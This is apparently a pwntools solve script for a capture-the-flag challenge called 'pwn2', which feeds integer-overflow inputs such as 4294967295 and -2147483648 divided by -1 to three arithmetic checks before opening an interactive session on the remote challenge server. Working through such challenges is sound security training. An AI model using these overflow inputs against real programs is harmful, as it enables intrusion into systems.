from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./pwn2')
    elf = ELF('./pwn2')
else:
    p = remote('pwn.challenge.ctf.show', 28110)
    elf = ELF('./pwn2')
    pause()
p.recvuntil(b'1.a-b=9,0<=a<9,0<=b<9\n')
p.sendline(b'8')
p.sendline(b'4294967295')
p.recvuntil(b'2.a*b=9,a>9,b>9\n')
p.sendline(b'383291')
p.sendline(b'22411')
p.recvuntil(b'3.a/b=ERROR,b!=0\n')
p.sendline(b'-2147483648')
p.sendline(b'-1')
p.interactive()